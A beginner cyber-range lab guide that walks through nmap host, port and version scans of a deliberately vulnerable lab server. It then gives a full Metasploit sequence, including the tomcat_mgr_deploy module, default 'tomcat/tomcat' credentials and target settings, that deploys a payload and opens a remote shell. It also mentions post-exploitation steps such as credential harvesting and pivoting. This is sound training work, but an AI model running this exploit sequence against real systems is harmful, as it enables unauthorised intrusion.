## Scenario 1: Network Reconnaissance & Exploitation

> **Network:** Your lab uses `$TARGET_SUBNET` (formula `10.0.<50+pod_id>.0/24`). Kali `$TARGET_KALI`, Meta `$TARGET_META`, DVWA `$TARGET_DVWA`.

A guided, beginner walkthrough. Read each step's _“What you're doing & why”_ box as you go, you'll finish knowing not just the commands, but what each one actually does.

Easy 30–45 min · MITRE T1046 · Attacker (Kali) · 4 milestones

## 0. Before you start: the big picture

This scenario walks you through the first two phases of almost every real attack, in order:

You are the **attacker**, working from a **Kali Linux** machine (a Linux distribution pre-loaded with security tools). Your job is to discover a target machine called **Meta**, learn what it's running, and break into it through a misconfigured web service. Everything happens inside your own **isolated lab environment**, a private mini-network that only you can touch, so nothing you do here leaves the lab.

**What is the lab environment?** When you start Scenario 1, the portal spins up a small private network just for you: your Kali box plus one or two target machines. They can see each other but nothing outside. That's why you can attack freely, these targets are _meant_ to be broken into for training. 

### Your network

Every lab gets its own subnet using the formula `10.0.<50+pod_id>.0/24`. The examples below assume lab slot 1 (`$TARGET_SUBNET`), **use the IPs shown in your own lab header if they differ.**

Host | IP | What it is / how you reach it  
--- | --- | ---  
**Kali (you)** | `$TARGET_KALI` | Your attack box. Open the **Kali Linux (CLI)** tab in the portal, you type commands here.  
**Meta** | `$TARGET_META` | The main target (a deliberately vulnerable Linux server). Runs ports 21, 22, 80, and 8180 (Tomcat).  
**DVWA** | `$TARGET_DVWA` | A second target, only used for the optional stretch scans here.  
  
Shortcut Your Kali shell already has the target IPs saved as environment variables: `$TARGET_META` and `$TARGET_DVWA`. You can type `echo $TARGET_META` to confirm, and use the variable in place of the IP in any command. 

## 1. The two tools you'll use

### Nmap, the network scanner

**Nmap** ("Network Mapper") sends specially crafted packets to other machines and listens for how they reply. From those replies it can tell you: which hosts are alive, which network **ports** are open, and often what software (and version) is listening on each port. Tasks 1–3 are all Nmap, each time asking a more detailed question.

What's a "port"? A single machine runs many services at once (web, SSH, FTP…). A **port** is a numbered door, web servers usually sit on port 80, SSH on 22, FTP on 21. Finding open ports tells you which doors are worth trying. 

### Metasploit, the exploitation framework

**Metasploit** is a toolkit of ready-made exploits. You launch its console (`msfconsole`), pick an exploit **module** , tell it your target and options, and run it. In Task 4 you'll use it to abuse a Tomcat server that still has its **default password** , uploading a payload that hands you a remote shell.

## 2. How scoring works (read this, it's the #1 source of confusion)

The scorer **does not watch your screen**. For Tasks 1–4 it reads your **Kali command history** (and, for Task 4, your **Metasploit history**) looking for evidence that you ran the right command. Think of it like a lab notebook: the grader only sees what you _wrote down_ in your history, not what happened live. Task 5 is different - it is scored by the **flag you submit** (see Task 5).

Two habits that make scoring reliable **1.** After a command succeeds, press **Enter** once (this flushes it to history). Scoring is automatic within a few seconds; you usually don't need to do anything.  
**2.** Every task runs from the **Kali Linux (CLI)** tab - including the Task 5 flag (`whoami`). 

**Points:** the five milestones total the scenario's score. Tasks 1–4 are scored automatically once your command lands in your history; Task 5 clears when you submit the correct flag.

---

### Task 1: find what's alive on the subnet

**Goal:** find which machines are alive on your subnet `$TARGET_SUBNET`.

> **What you're doing & why:** Before you can attack anything, you need to know what's _out there_. This is a **ping sweep** : Nmap pings every one of the 254 possible addresses in the subnet and reports which ones answer. No ports are scanned yet, you're just taking attendance. 
```bash
nmap -sn $TARGET_SUBNET
```

Part | What it means  
--- | ---  
`nmap` | run the scanner  
`-sn` | **"ping scan, no port scan"**, just check which hosts are up. (The `s` is for scan type; `n` means "skip the port scan".)  
`$TARGET_SUBNET` | the whole subnet, the `/24` means "scan all 256 addresses from .0 to .255".  
  
**Done when:** you see replies from at least `$TARGET_META` (Meta) and `$TARGET_DVWA` (DVWA), plus your own Kali.

**Then:** scoring runs automatically - _Host Discovery_ ticks within a few seconds.

What you can do with this You now have a live-host map of your subnet, that's your **scope**. From here you stop scanning the whole `/24` and focus on the box worth attacking: **Meta ($TARGET_META)**. Everything downstream targets that host. 

If something's off Subnet variable empty? Run `echo $TARGET_SUBNET` or read the IP strip in the lab header. No replies at all? Make sure you are typing in the **Kali Linux (CLI)** tab. 


### Task 2: find the open doors on Meta

**Goal:** list the open TCP ports on Meta (you should find 21, 22, 80, and 8180).

> **What you're doing & why:** Now that you know Meta is alive, you knock on its doors. Each **open port** is a running service you might be able to attack. Port **8180** is the interesting one here, that's Apache Tomcat, your way in later. 

#### Recommended (includes 8180)
```bash
nmap -p 21,22,80,8180 $TARGET_META
```

Optional faster common-port scan (may miss 8180):
```bash
nmap -F $TARGET_META
```

Part | What it means  
--- | ---  
`-p 21,22,80,8180` | scan **these specific ports**, includes Tomcat on **8180**, which this task's Done-when requires  
`-F` | **"fast scan"**, only the 100 most common ports; convenient, but **8180 is not in that set**  
  
Please don't run `-p-` first A full `-p-` scan checks all 65,535 ports and is slow on a shared lab host. Prefer `-p 21,22,80,8180`; only do a full scan if you genuinely need it. 

**Done when:** you can see Meta's open ports, **including 8180**.

**Then:** scoring runs automatically - _Port Enumeration_ ticks within a few seconds.

What you can do with this Each open port is a running service you might attack. Port **8180 (Tomcat)** is the promising door here. Next you'll fingerprint its exact version to find a matching exploit, and you can ignore the closed ports entirely. 


### Task 3: identify the software & versions

**Goal:** find out _which software and version_ is running on each interesting port.

> **What you're doing & why:** Knowing a port is open isn't enough, you want to know _exactly_ what's listening (e.g. "Apache Tomcat 5.5"). Version strings are gold: they tell you which known exploits might work. Nmap does this by reading the little "banner" each service sends when you connect. 
```bash
nmap -sV -p 21,22,80,8180 $TARGET_META
```

Part | What it means  
--- | ---  
`-sV` | **"service/version detection"**, probe each open port and report the software name and version.  
`-p 21,22,80,8180` | limit the probe to the ports you already found (faster than re-scanning everything).  
  
Scoring detail The checker specifically looks for an `nmap` command containing `-sV` in your history, so make sure `-sV` is in the line you actually run. 

**Done when:** the output shows versions, e.g. OpenSSH on 22, Apache on 80, and **Tomcat on 8180**.

**Then:** scoring runs automatically - _Service Version Detection_ ticks within a few seconds.

What you can do with this Version strings are gold. Search them in **Exploit-DB** or Metasploit (`search tomcat_mgr`) to find a known exploit for that exact software, this is how recon turns into the working attack you run in Task 4. 


### Task 4: break into Tomcat and get a shell

**Goal:** use Metasploit to break into Meta's Tomcat on port 8180 and land a shell as the `tomcat` user.

> **What you're doing & why:** Apache Tomcat has an admin panel called **Manager** that can install web apps. If it still uses the **default password** (`tomcat`/`tomcat`), anyone can log in and upload their own app, which is really code that runs on the server. Metasploit automates all of this: it logs in, deploys a malicious app, triggers it, and gives you a remote shell. This is why **default credentials** are one of the most common real-world weaknesses. 

#### Step 1, get Meta's IP (Kali shell, before Metasploit)

`msfconsole` does **not** expand shell variables. If you type the characters `$TARGET_META` inside Metasploit, the exploit will not reach Meta and you will get **no session**.

In the **Kali** shell (not yet in msf), run:

```bash
echo $TARGET_META
```

Remember that IP (same as **Meta** in the lab header; in lab slot 1 it's usually `10.0.51.20`). You will paste **those digits** into `set RHOSTS` below. When this Guide is loaded in the portal, the Copy button on the next block should already show your real Meta IP in place of `$TARGET_META`, use that.

#### Step 2, launch Metasploit

_**`msfconsole -q`** - starts the Metasploit console (`-q` skips the banner). This is the tool that runs the exploit; you'll get an `msf >` prompt._
```bash
msfconsole -q
```

#### Step 3, configure and run (inside msfconsole)

> **Required, or you get *Exploit completed, but no session was created*:**  
> 1. `set RHOSTS` must be the **numeric Meta IP** (not the literal text `$TARGET_META`)  
> 2. `set PATH /manager/text`  
> 3. `set TARGET 1` (must be set **before** `run`)

**Run these inside `msfconsole`, one command at a time, in this order.** Each
block has its own Copy button - copy, paste, press Enter, then move to the next.
Do **not** paste them all at once.

_**`use …`** - load the Tomcat Manager deploy exploit module into Metasploit._
```bash
use exploit/multi/http/tomcat_mgr_deploy
```
_**`set RHOSTS`** - tell the exploit which host to hit: Meta's numeric IP (the Copy button fills in your real IP)._
```bash
set RHOSTS $TARGET_META
```
_**`set RPORT 8180`** - the port Tomcat Manager listens on in this lab._
```bash
set RPORT 8180
```
_**`set HttpUsername tomcat`** - the Manager login username (the default this box never changed)._
```bash
set HttpUsername tomcat
```
_**`set HttpPassword tomcat`** - the matching default password; together they let the exploit log in._
```bash
set HttpPassword tomcat
```
_**`set PATH /manager/text`** - the Manager API path on this Debian Tomcat; required or the upload fails._
```bash
set PATH /manager/text
```
_**`set TARGET 1`** - pick the Java Universal payload target; without it the exploit usually finishes with **no session**._
```bash
set TARGET 1
```
_**`run`** - fire the exploit: it uploads a payload and opens your shell on Meta._
```bash
run
```

Command | What it does  
--- | ---  
`use …` | select the Tomcat Manager deploy exploit  
`set RHOSTS` | Meta's **numeric** IP (from Step 1 / lab header)  
`set RPORT 8180` | Tomcat port  
`set HttpUsername / HttpPassword` | defaults `tomcat` / `tomcat`  
`set PATH /manager/text` | **required** Manager API path on this Debian Tomcat  
`set TARGET 1` | **required** payload target, without this, Metasploit often finishes with **no session**  
`run` | fire the exploit  

#### Step 4, confirm you're in (inside the new session)

The session that opens is a **Meterpreter** prompt (`meterpreter >`), which is
Metasploit's own interpreter - plain Linux commands like `id`/`whoami` return
*"Unknown command"* there. First drop to a real command shell:

_**`shell`** - leaves Meterpreter and gives you a normal Linux shell on Meta, where ordinary commands work._
```bash
shell
```

_**`id`** - shows the user/group you are running as, to prove the foothold._
```bash
id
```

Success looks like:

```text
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

(The numeric uid may differ; the name in parentheses must be `tomcat`.) Tip: if
you'd rather stay in Meterpreter, `getuid` shows the same account without a shell.

#### Step 5, exit back to the msf prompt (required for scoring)

You went **two levels deep** - the exploit opened Meterpreter, and you ran
`shell` inside it - so you need to **type `exit` twice** to climb back out:

_First `exit` - leaves the Linux shell and returns you to the `meterpreter >` prompt._
```bash
exit
```
_Second `exit` - closes the Meterpreter session and returns you to the `msf exploit(...) >` prompt (you'll see "Shutting down session")._
```bash
exit
```

> **Why exit matters:** scoring reads your **Metasploit history**, which isn't fully written until the session/console activity is flushed. This milestone can stay unscored until you actually run `exit`. If it still hasn't scored after a working shell, run one more msf command or close `msfconsole` cleanly.

**Done when:** you got a `tomcat` shell (e.g. `uid=1001(tomcat) …`), your msf history includes numeric `set RHOSTS …`, `set PATH /manager/text`, and `set TARGET 1`, and you ran `exit`.

**Then:** scoring runs automatically - _Tomcat Manager Exploitation_ ticks within a few seconds.

> **What you can do with this:** You have a shell as the `tomcat` service account. From this foothold you'd enumerate the host, hunt for a **privilege-escalation** path to root, harvest credentials and config files, and pivot to other machines on the lab network. This shell is the launch point for the rest of an engagement. 


### Task 5: capture the flag (whoami)

**Goal:** run `whoami` in your Kali terminal and submit the username it prints.

> **What you're doing & why:** `whoami` is the first thing you run on any box to
> know *which account you are*. Here your answer **is the flag** - a single short
> word you type in, so there's nothing to copy out of the terminal.

**Which tool:** the **Kali Linux (CLI)** tab - the same terminal you used for
Tasks 1–4. Nothing else is needed.

#### Step 1 - ask the terminal who you are

_**`whoami`** - prints the account name you're logged in as on Kali. That single word is your flag (short and easy to type - no copying needed)._
```bash
whoami
```

#### Step 2 - submit the word it prints
It prints one word - your Kali username (for example `student`). On the right,
open the **Tasks** panel, find **Capture the Flag (whoami)**, type that word into
**Submit the flag you found**, and click **Submit**.

- **Correct → the task completes and the points are awarded.**
- **Wrong → no points, with a message to check it and try again.**

**How it's scored:** by the word you submit (your live `whoami`).

---
## 3. Recon playground (explore, not scored)

Once your four milestones are green, try these to go deeper and actually understand what recon can reveal. They're safe here, it's your isolated lab. Run them from the **Kali** tab against Meta (`$TARGET_META`) or DVWA (`$TARGET_DVWA`).

Command | What it teaches / what you'll see  
--- | ---  
`sudo nmap -O $TARGET_META` | Guesses the target's **operating system** from subtle quirks in how it replies.  
`nmap -sV -sC $TARGET_META` | Service versions **plus** default NSE scripts, banners, page titles, and extra clues.  
`nmap --script vuln $TARGET_META` | Runs vulnerability-detection scripts that flag known CVEs on the open services.  
`nmap -p- $TARGET_META` | Scans all 65,535 ports (slow). Be courteous on a shared host, use only when you truly need it.  
`nmap -sU --top-ports 20 $TARGET_META` | Checks common **UDP** services (DNS, SNMP…) that TCP scans never see.  
`whatweb http://$TARGET_DVWA` · `curl -I http://$TARGET_DVWA` | Identifies the web server/tech and shows response headers without opening a browser.  
In msfconsole after your shell: `sysinfo` · `getuid` · `shell` | Confirms who and where you are on Meta, and drops you into a full system shell.  
  
These are noisy OS, version, and `--script vuln` scans light up a defender's sensors. Analysing exactly that noise is **Scenario 3 (SIEM Alert Triage)**. None of this is required to finish this room. 

## 4. Common failures & fixes

Symptom | Fix  
--- | ---  
Task not scored after nmap | Press **Enter** , wait ~2s. Make sure you're in the Kali tab.  
No route / host down | Confirm the lab is **ACTIVE** ; use the exact IPs from your lab header.  
`Exploit completed, but no session was created` | Almost always missing **`set TARGET 1`** before `run`, or `set RHOSTS` was the literal text `$TARGET_META` instead of digits. Fix both, `run` again.  
Tomcat exploit fails / no shell | History must show **`set PATH /manager/text`**, **`set TARGET 1`**, `RPORT 8180`, creds `tomcat`/`tomcat`, and a numeric Meta IP on `RHOSTS`.  
Wrong tab | Every command runs from the **Kali Linux (CLI)** tab.  
Guide still shows `msf6 >` / `search tomcat` / no `TARGET 1` | Hard-refresh the Guide panel; on the host confirm `grep TARGET ~/cyberrange/portal/public/scenarios/scenario_01_network_reconnaissance.md` includes `set TARGET 1`.  
